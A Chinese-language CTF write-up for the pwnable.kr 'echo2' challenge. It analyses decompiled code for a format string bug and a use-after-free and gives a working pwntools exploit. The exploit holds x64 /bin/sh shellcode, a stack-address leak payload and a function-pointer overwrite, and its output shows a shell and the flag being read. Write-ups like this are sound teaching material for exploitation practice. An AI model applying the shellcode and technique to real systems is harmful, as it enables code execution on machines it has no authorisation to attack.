---
title: pwnable.kr-echo2
date: 2018-03-10 10:41:00
tags: [pwnable.kr,PWN]
categories: CTF
copyright: true
---
# 前言 
这道题和上一题主逻辑一样，主要是漏洞不一样了，这道题考察格式化支付串漏洞和堆的释放后重用漏洞。
# 分析
先分析反编译代码
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int *v3; // rsi@1
  _QWORD *v4; // rax@1
  int v6; // [sp+Ch] [bp-24h]@1
  _QWORD v7[4]; // [sp+10h] [bp-20h]@1

  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 1, 0LL);
  o = malloc(0x28uLL);
  *((_QWORD *)o + 3) = greetings;
  *((_QWORD *)o + 4) = byebye;
  printf("hey, what's your name? : ", 0LL);
  v3 = (int *)v7;
  __isoc99_scanf("%24s", v7);
  v4 = o;
  *(_QWORD *)o = v7[0];
  v4[1] = v7[1];
  v4[2] = v7[2];
  id = v7[0];
  getchar();
  func[0] = (__int64)echo1;
  qword_602088 = (__int64)echo2;
  qword_602090 = (__int64)echo3;
  v6 = 0;
  do
  {
    while ( 1 )
    {
      while ( 1 )
      {
        puts("\n- select echo type -");
        puts("- 1. : BOF echo");
        puts("- 2. : FSB echo");
        puts("- 3. : UAF echo");
        puts("- 4. : exit");
        printf("> ", v3);
        v3 = &v6;
        __isoc99_scanf("%d", &v6);
        getchar();
        if ( (unsigned int)v6 > 3 )
          break;
        ((void (__fastcall *)(const char *, int *))func[(unsigned __int64)(unsigned int)(v6 - 1)])("%d", &v6);
      }
      if ( v6 == 4 )
        break;
      puts("invalid menu");
    }
    cleanup();
    printf("Are you sure you want to exit? (y/n)", &v6);
    v6 = getchar();
  }
  while ( v6 != 121 );
  puts("bye");
  return 0;
}
```
```c
__int64 echo2()
{
  char format; // [sp+0h] [bp-20h]@1

  (*((void (__fastcall **)(_QWORD))o + 3))(o);
  get_input(&format, 32LL);
  printf(&format);
  (*((void (__fastcall **)(_QWORD))o + 4))(o);
  return 0LL;
}
```
```c
__int64 echo3()
{
  char *s; // ST08_8@1

  (*((void (__fastcall **)(_QWORD))o + 3))(o);
  s = (char *)malloc(0x20uLL);
  get_input(s, 32LL);
  puts(s);
  free(s);
  (*((void (__fastcall **)(_QWORD, _QWORD))o + 4))(o, 32LL);
  return 0LL;
}
```
程序这次只实现了`echo2`和`echo3`函数。分析可以发现，`echo2`函数中有格式化字符串漏洞。利用这个漏洞可以读写任意8字节内存。开始想得利用方式是向`v7`变量（就是要输入的名字）写shellcode然后通过该漏洞改写返回地址跳转到该处执行，但是实际上栈地址是64位的想一次写入64位的整数到内存用时太长，特别是在题目平台更长。所以这种方法并不可取。
另一处漏洞需要`echo3`函数配合`main`函数里的一处逻辑缺陷来制造`uaf漏洞`。仔细分析`main`函数发现，如果在选择`4`选项退出时，程序会执行`cleanup`函数，该函数会执行`free(o)`释放掉先前申请的`0x28`大小的堆空间。接下来程序又会询问是否退出，否的话又会进入主逻辑执行。很明显的一处释放后重用。而`echo3`函数中申请了`0x20`大小的堆空间，根据glibc的堆管理策略，这次申请的堆会直接使用上次释放的堆块，这样如果覆盖了第4个8字节就会导致后面执行`(*((void (__fastcall **)(_QWORD))o + 3))(o);`时执行任意覆盖的地址了。利用这个漏洞就能解决`printf`写内存的困难。
整理下利用思路，向`v7`变量覆盖shellcode，使用`prinf`的漏洞leak处栈地址然后计算处`v7`的地址，之后利用uaf漏洞跳转到`v7`执行。下面是exp
```python
from pwn import *

def work(DEBUG):
    context(arch='amd64',os='linux',log_level='info')
    if DEBUG:
        r = process('./echo2')
    else:
        r = remote('pwnable.kr',9011)
        
    
    shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"# 23 bytes
    
    #context.terminal=['gnome-terminal','-x','sh','-c']
    #gdb.attach(proc.pidof(r)[0])
    
    r.recvuntil(' : ')
    r.sendline(shellcode)
    r.recvuntil('> ')
    r.sendline('2')
    r.recvuntil('\n')
    r.sendline('%10$016lx') # get rbp addr
    
    rbp_addr = int(r.recv(16),16)
    v7_addr = rbp_addr-0x20
    
    r.recvuntil('> ')
    r.sendline('4')
    r.recvuntil('(y/n)')
    r.sendline('n\n3\n'+'a'*24+p64(v7_addr))
    
    r.recvuntil('> ')
    r.sendline('3')
    r.interactive()

work(False)
```
```bash
root@1:~/桌面/test$ python 1.py 
[+] Opening connection to pwnable.kr on port 9011: Done
[*] Switching to interactive mode
hello 
aaaaaaaaaaaaaaaaaaaaaaaa0\x1f\xb4>\xfe\x7f
goodbye 

- select echo type -
- 1. : BOF echo
- 2. : FSB echo
- 3. : UAF echo
- 4. : exit
> sh: 1: 3: not found
$ ls
echo2
flag
log
super.pl
$ cat flag
fun_with_UAF_and_FSB :)
$  
```
另外注意这是linux的x64环境下，`printf`的利用需要考虑前6个参数是寄存器传递的，要计算好。
# 总结
两个漏洞的配合最后拿下shell，很爽。